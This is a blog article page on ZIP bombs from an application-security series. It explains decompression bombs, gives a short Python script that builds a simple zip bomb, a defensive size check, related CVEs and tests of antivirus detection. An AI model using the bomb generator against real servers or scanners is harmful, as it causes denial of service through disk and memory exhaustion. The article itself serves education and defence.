@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en-US">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="author" content="Martin Thoma" />
+        <meta name="copyright" content="Martin Thoma" />
+        <link title = "Martin Thoma"
+              type  = "application/opensearchdescription+xml"
+              rel   = "search"
+              href  = "../opensearch.xml">
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="Machine Learning, My bits and bytes, " />
+
+<meta property="og:title" content="ZIP Bombs 💣😈  - Make your storage explode 💥 "/>
+<meta property="og:url" content="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112" />
+<meta property="og:description" content="A zip bomb is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of 42kB. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses …" />
+<meta property="og:site_name" content="Martin Thoma" />
+<meta property="og:article:author" content="Martin Thoma" />
+<meta property="og:article:published_time" content="2020-05-17T20:00:00+02:00" />
+<meta name="twitter:title" content="ZIP Bombs 💣😈  - Make your storage explode 💥 ">
+<meta name="twitter:description" content="A zip bomb is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of 42kB. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses …">
+<meta property="og:image" content="logos/star.png" />
+<meta name="twitter:image" content="logos/star.png" >
+
+        <title>ZIP Bombs 💣😈  - Make your storage explode 💥  · Martin Thoma
+</title>
+        <!-- Latest compiled and minified CSS -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="../theme/css/pygments.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../theme/tipuesearch/tipuesearch.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../theme/css/elegant.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="../static/print.css" media="print">
+        <link rel="stylesheet" type="text/css" href="../static/custom.css" media="screen">
+
+        <!-- MathJax -->
+<script type="text/x-mathjax-config">
+<!--
+MathJax.Hub.Config({
+  jax: ["input/TeX", "output/HTML-CSS"],
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [ ['$$', '$$'], ['\\[','\\]']],
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+    processEscapes: true
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+// -->
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+        <link href="https://martin-thoma.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Martin Thoma - Full Atom Feed" />
+        <link href="https://martin-thoma.com/feeds/index.xml" type="application/rss+xml" rel="alternate" title="Martin Thoma - Full RSS Feed" />
+    </head>
+    <body>
+        <div id="content-sans-footer">
+        <div class="navbar navbar-static-top navbar-default">
+            <div class="container">
+                <div class="container-fluid">
+                    <div class="collapse navbar-collapse">
+                        <ul class="nav pull-left top-menu navbar-nav">
+                            <li><a href=".." style="font-family: 'Monaco', 'Inconsolata', 'Andale Mono', 'Lucida Console', 'Bitstream Vera Sans Mono', 'Courier New', Courier, Monospace;
+                        font-size: 20px;" class="navbar-brand" tabindex="-1">Martin Thoma</a>
+                            </li>
+                        </ul>
+                        <ul class="nav pull-right top-menu navbar-nav">
+                            <li ><a href="..">Home</a></li>
+                            <li ><a href="../categories.html">Categories</a></li>
+                            <li ><a href="../tags.html">Tags</a></li>
+                            <li ><a href="../archives.html">Archives</a></li>
+                            <li><a href="../support-me/">Support me</a></li>
+                            <li><form class="navbar-form" action="../search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="search" class="search-query form-control" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-1 col-md-1"></div>
+                <div class="col-sm-10 col-md-10">
+<article>
+<div class="row">
+    <header class="page-header col-sm-10 col-md-10 col-md-offset-2">
+    <h1><a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"> ZIP Bombs 💣😈  <small> Make your storage explode 💥 </small>  </a></h1>
+    </header>
+</div>
+
+<div class="row">
+    <div class="col-sm-2 col-md-2 table-of-content">
+        <nav>
+        <h4>Contents</h4>
+        <div id="toc"><ul><li><a class="toc-href" href="#how-to-create-a-zip-bomb" title="How to create a ZIP bomb">How to create a ZIP bomb</a></li><li><a class="toc-href" href="#should-i-be-worried" title="Should I be worried?">Should I be worried?</a></li><li><a class="toc-href" href="#get-the-size-of-a-zip-file-without-extracting-data" title="Get the size of a ZIP file without extracting data">Get the size of a ZIP file without extracting data</a></li><li><a class="toc-href" href="#the-state-of-av-software" title="The State of AV Software">The State of AV Software</a><ul><li><a class="toc-href" href="#virustotal" title="Virustotal">Virustotal</a></li><li><a class="toc-href" href="#clamav" title="ClamAV">ClamAV</a></li><li><a class="toc-href" href="#commercial-av-software" title="Commercial AV Software">Commercial AV Software</a></li></ul></li><li><a class="toc-href" href="#whats-next_1" title="What&rsquo;s next?">What&rsquo;s next?</a></li></ul></div>
+        </nav>
+    </div>
+    <div class="col-sm-8 col-md-8 article-content" id="contentAfterTitle">
+
+            
+            <p>A <a href="https://en.wikipedia.org/wiki/Zip_bomb">zip bomb</a> is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of <strong>42kB</strong>. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses to a size of 4.3GB . This file is added in total over a million times to the archive, leading to a total unpacked size of <strong>4.5PB</strong> . This is well over the size of any available storage system.</p>
+<blockquote>
+<h1 id="zip-bombs-are-a-form-of-decompression-bomb-decompression-bombs-are-compressed-files-which-extract-to-a-crazy-file-size-decompression-bombs-are-a-form-of-denial-of-service-attacks">Zip bombs are a form of decompression bomb. Decompression bombs are compressed files which extract to a crazy file size. Decompression bombs are a form of denial-of-service attacks.</h1>
+</blockquote>
+<p>Unpacking such an archive can lead in various systems to problems which are all connected to running either out of memory or out of disk space. For example, an anti-virus scanner might unpack the ZIP file and thus get killed due to memory exhaustion. A backend server might fill up its disk and no longer be able to operate.</p>
+<h2 id="how-to-create-a-zip-bomb">How to create a ZIP bomb</h2>
+<p>The simplest ZIP bombs are super easy to create. You can simply use the packages found within Python:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">tempfile</span> <span class="kn">import</span> <span class="n">mkstemp</span>
+<span class="kn">from</span> <span class="nn">zipfile</span> <span class="kn">import</span> <span class="n">ZIP_LZMA</span><span class="p">,</span> <span class="n">ZipFile</span>
+
+
+<span class="k">def</span> <span class="nf">create_txt_file</span><span class="p">(</span><span class="n">size_in_byte</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">handle</span><span class="p">,</span> <span class="n">filepath</span> <span class="o">=</span> <span class="n">mkstemp</span><span class="p">(</span><span class="n">suffix</span><span class="o">=</span><span class="s2">".txt"</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">"zip-txt-"</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">handle</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
+        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"0"</span> <span class="o">*</span> <span class="n">size_in_byte</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">filepath</span>
+
+
+<span class="k">def</span> <span class="nf">create_zipbomb</span><span class="p">(</span><span class="n">inner_file_size</span><span class="o">=</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">,</span> <span class="n">nb_inner_files</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+    <span class="n">filepath</span> <span class="o">=</span> <span class="n">create_txt_file</span><span class="p">(</span><span class="n">size_in_byte</span><span class="o">=</span><span class="n">inner_file_size</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">ZipFile</span><span class="p">(</span><span class="s2">"zipbomb.zip"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">,</span> <span class="n">ZIP_LZMA</span><span class="p">)</span> <span class="k">as</span> <span class="n">myzip</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nb_inner_files</span><span class="p">):</span>
+            <span class="n">myzip</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">.txt"</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">create_zipbomb</span><span class="p">(</span><span class="n">inner_file_size</span><span class="o">=</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">9</span><span class="p">,</span> <span class="n">nb_inner_files</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</code></pre></div>
+<p>David Fifield also proved that it&rsquo;s possible to create a zip bomb with has 42MB and extracts to 4.5PB in a <strong>non-recursive</strong> way (<a href="https://www.bamsoftware.com/hacks/zipbomb/">source</a>).</p>
+<p>There are also quines for ZIP files. A quine is a program that produces its source code as output. A ZIP-quine contains itself when uncompressed. One well-known one is droste.zip (<a href="https://alf.nu/ZipQuine">source</a>), but there are more (<a href="https://research.swtch.com/zip">source</a>).</p>
+<p>You might also be able to create them manually by investigating the <a href="https://www.iso.org/standard/60101.html">ZIP standard</a> and crafting the file.</p>
+<h2 id="should-i-be-worried">Should I be worried?</h2>
+<p>I wouldn&rsquo;t be worried. As <a href="https://en.wikipedia.org/wiki/Tavis_Ormandy">Travis Ormandy</a> pointed out, 21 out of 58 anti-virus programs could detect the zip bomb. 6 timed out, 11 could not process the files and 20 thought the file is fine.</p>
+<p>This article is more of a friendly reminder that this type of attack exists and that one should be careful when archives are unpacked.</p>
+<p>I found this topic in a couple of places:</p>
+<ul>
+<li>2005: bzip2 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2005-1260">CVE-2005&ndash;1260</a>)</li>
+<li>2009: Apache Tika (<a href="https://issues.apache.org/jira/browse/TIKA-259?attachmentSortBy=fileName">Safe parsing of droste.zip</a>)</li>
+<li>2018: Akka (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16131">CVE-2018&ndash;16131</a>)</li>
+<li>2019: Python (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9674">CVE-2019&ndash;9674</a>)</li>
+<li>2019: Info-ZIP (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13232">CVE-2019&ndash;13232</a>)</li>
+<li>2019: ClamAV (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12625">CVE-2019&ndash;12625</a>)</li>
+<li>2020: Wireshark (<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25866">CVE-2020&ndash;25866</a>)</li>
+</ul>
+<h2 id="get-the-size-of-a-zip-file-without-extracting-data">Get the size of a ZIP file without extracting data</h2>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">zipfile</span>
+
+
+<span class="k">def</span> <span class="nf">get_extracted_size</span><span class="p">(</span><span class="n">filepath</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="sd">"""Get the extracted size in bytes."""</span>
+    <span class="n">zp</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">zinfo</span><span class="o">.</span><span class="n">file_size</span> <span class="k">for</span> <span class="n">zinfo</span> <span class="ow">in</span> <span class="n">zp</span><span class="o">.</span><span class="n">filelist</span><span class="p">])</span>
+</code></pre></div>
+<p>Simple enough, isn&rsquo;t it?</p>
+<p>The problem is that you can nest ZIP files. So the extracted files could again contain zipped files. If you apply recursion, you might want to have a maximum recursion depth and keep track of the used memory/disk space.</p>
+<h2 id="the-state-of-av-software">The State of AV Software</h2>
+<p>I was curious to know if anti-virus software can detect zip bombs. So I tested some and contacted some of the developers.</p>
+<h3 id="virustotal">Virustotal</h3>
+<p><a href="https://en.wikipedia.org/wiki/VirusTotal">Virustotal</a> offers a form where users can upload files and check the results of various programs. Here are the results for my test files:</p>
+<ul>
+<li><a href="https://www.virustotal.com/gui/file/bbd05de19aa2af1455c0494639215898a15286d9b05073b6c4817fe24b2c36fa/detection">42.zip</a>: Only <a href="https://en.wikipedia.org/wiki/Fortinet">Fortinet</a> detected it. 12 programs were unable to process it.</li>
+<li><a href="https://www.virustotal.com/gui/file/ad187b3c99dcaa837438d580a3886f67ac1799e475e8fced23a02fb44ebaf41f/detection">dorste.zip</a>: <a href="https://en.wikipedia.org/wiki/Avast">Avast</a>, <a href="https://en.wikipedia.org/wiki/AVG_AntiVirus">AVG</a>, Cyren, <a href="https://en.wikipedia.org/wiki/ESET">Eset</a>, <a href="https://en.wikipedia.org/wiki/Sophos">Sophos</a>, and <a href="https://en.wikipedia.org/wiki/Trend_Micro">Trend Micro</a> detected it. 10 programs were unable to process the file.</li>
+<li><a href="https://www.virustotal.com/gui/file/725d25f1f5ecf498210c546d517e25f70ea07b48423de2a4648db80b56b81f56/detection">self-built.zip</a>: Antiy-AVL, Baidu, MAX detected it. 7 timed out. 11 were unable to process it.</li>
+</ul>
+<h3 id="clamav">ClamAV</h3>
+<p>The first release of <a href="https://en.wikipedia.org/wiki/Clam_AntiVirus">ClamAV</a> was in 2001, it was developed by Cisco and is open-source now. I&rsquo;ve installed ClamAV 0.102.4/25962 . I try it with the <a href="https://pypi.org/project/clamd/">clamd</a> binding:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">clamd</span>
+
+<span class="n">cd</span> <span class="o">=</span> <span class="n">clamd</span><span class="o">.</span><span class="n">ClamdUnixSocket</span><span class="p">()</span>
+<span class="n">cd</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="s2">"/home/martin-thoma/bomb.zip"</span><span class="p">)</span>
+</code></pre></div>
+<p>It gave the same output fordroste.zip , 42.zip , and my self-built.zip . None of them were detected.</p>
+<h3 id="commercial-av-software">Commercial AV Software</h3>
+<p>I&rsquo;ve contacted Avast, AVG, ESET, Sophos, and Trend Micro via private Twitter messages. I&rsquo;ve explained that I&rsquo;m writing a blog post and that their product &mdash; according to VirusTotal &mdash; does not recognize the ZIP bombs.</p>
+<p><strong>TrendMicro</strong> sent me to their <a href="https://helpcenter.trendmicro.com/en-US/contact-support/">support site</a>. I think I wrote them a support ticket, but due to the fact that this is just a web form and I don&rsquo;t have any copy of that, I&rsquo;m not sure. Those contact forms are super annoying and I gave up trying to ask the question.</p>
+<p><strong>Sophos</strong> redirected me to their <a href="https://support.sophos.com/support">support site</a>. I have opened a case and I&rsquo;m waiting for a response.</p>
+<p><strong>Avast</strong> gave me a brief answer, but it was super unclear to me what they are actually doing. I&rsquo;m still trying to clarify.</p>
+<p><strong>AVG</strong> responded, but essentially told me that they try to find the answer to my question internally.</p>
+<p>In contrast, the experience with <strong>ESET</strong> was extremely positive. I&rsquo;ve got in contact with <a href="https://www.linkedin.com/in/thomas-uhlemann-6661a382/">Thomas Uhlemann</a> who could directly tell me what ESET is doing: They check archives until a depth of 10, meaning they can limit the effect of recursive packing. Additionally, they put limitations on the file size, memory usage, and the maximum amount of time for a scan. Apparently, the users can also adjust those limits. This information is also <a href="https://help.eset.com/eis/14/en-US/idh_config_threat_sense.html">publicly documented</a>.</p>
+<h2 id="whats-next_1">What&rsquo;s next?</h2>
+<p>In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:</p>
+<ul>
+<li>Part 1: <a href="https://medium.com/faun/sql-injections-e8bc9a14c95">SQL Injections</a> 😈</li>
+<li>Part 2: <a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80">Don&rsquo;t leak Secrets</a> 😇</li>
+<li>Part 3: <a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f">Cross-Site Scripting (XSS)</a> 😈</li>
+<li>Part 4: <a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636">Password Hashing</a> 😇</li>
+<li>Part 5: <a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112">ZIP Bombs</a> 😈</li>
+</ul>
+<p>And this is about to come:</p>
+<ul>
+<li>CSRF 😈</li>
+<li>DOS 😈</li>
+<li>Credential Stuffing 😈</li>
+<li>Cryptojacking 😈</li>
+<li>Single-Sign-On 😇</li>
+<li>Two-Factor Authentication 😇</li>
+<li>Backups 😇</li>
+<li>Disk Encryption 😇</li>
+</ul>
+<p>Let me know if you are interested in more articles! (info@martin-thoma.de)</p>
+            
+            <div id="disqus_thread" class="no-print"></div>
+<script>
+    /*
+    var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+        var d = document, s = d.createElement('script');
+
+        s.src = '//martinthoma.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+            <hr/>
+        </div>
+        <section>
+        <div class="col-sm-2 col-md-2" style="float:right;font-size:0.9em;">
+            <h4>Published</h4>
+            <time pubdate="pubdate" datetime="2020-05-17T20:00:00+02:00">Mai 17, 2020</time>
+            <br/>
+            by <a rel="author" class="vcard author post-author" itemprop="author" href="../author/martin-thoma/"><span class="fn" itemscope="" itemtype="https://schema.org/Person"><span itemprop="name">Martin Thoma</span></span></a>
+            <h4>Category</h4>
+            <a class="category-link" href="../categories.html#my-bits-and-bytes-ref">My bits and bytes</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="../tags.html#machine-learning-ref">Machine Learning
+                    <span>81</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+    <a href="https://twitter.com/themoosemind" title="My Twitter Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-twitter sidebar-social-links"></i></a>
+    <a href="mailto:info@martin-thoma.de" title="My Email Address" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-envelope sidebar-social-links"></i></a>
+    <a href="https://github.com/MartinThoma" title="My Github Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-github sidebar-social-links"></i></a>
+    <a href="http://stackoverflow.com/users/562769/martin-thoma" title="My Stackoverflow Profile" class="sidebar-social-links" target="_blank">
+    <i class="fa fa-stackoverflow sidebar-social-links"></i></a>
+        </div>
+        </section>
+</div>
+</article>
+                </div>
+                <div class="col-sm-1 col-md-1"></div>
+            </div>
+        </div>
+        <div id="push"></div>
+    </div>
+<footer class="no-print">
+<div id="footer">
+    <ul class="footer-content">
+        <li class="elegant-subtitle"><span class="site-name">Martin Thoma</span> - A blog about Code, the Web and Cyberculture</li>
+        <li><a href="https://martin-thoma.com/feeds/index.xml">RSS-Feed</a></li>
+        <li><a href="http://www.martin-thoma.de/privacy.htm">Datenschutzerkl&auml;rung</a></li>
+        <li><a href="http://www.martin-thoma.de/impressum.htm">Impressum</a></li>
+        <li class="elegant-power">Powered by <a href="http://getpelican.com/" title="Pelican Home Page" tabindex="-1">Pelican</a>. Theme: <a href="http://oncrashreboot.com/pelican-elegant" title="Theme Elegant Home Page" tabindex="-1">Elegant</a> by <a href="http://oncrashreboot.com" title="Talha Mansoor Home Page" tabindex="-1">Talha Mansoor</a></li>
+    </ul>
+</div>
+</footer>        <script src="//code.jquery.com/jquery.min.js"></script>
+        <!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+        <script>
+(function(){
+    'use strict';
+
+    /*
+    Create intra-page links
+    Requires that your headings already have an `id` attribute set
+    For every heading in your page, this adds a little anchor link `#` that you can click to get a permalink to the heading.
+    Ignores `h1`, because you should only have one per page.
+    The text content of the tag is used to generate the link, so it will fail "gracefully-ish" if you have duplicate heading text.
+
+    Credit: https://gist.github.com/SimplGy/a229d25cdb19d7f21231
+     */
+
+    var headingNodes = [], results, link,
+        tags = ['h2', 'h3', 'h4', 'h5', 'h6'];
+
+    tags.forEach(function(tag){
+        var contentTag = document.getElementById('contentAfterTitle');
+      results = contentTag.getElementsByTagName(tag);
+      Array.prototype.push.apply(headingNodes, results);
+    });
+
+    headingNodes.forEach(function(node){
+      link = document.createElement('a');
+      link.className = 'deepLink';
+      link.textContent = ' ¶';
+      link.href = '#' + node.getAttribute('id');
+      node.appendChild(link);
+    });
+
+  })();
+</script>
+    </body>
+    <!-- Theme: Elegant built for Pelican
+    License : http://oncrashreboot.com/pelican-elegant -->
+</html>
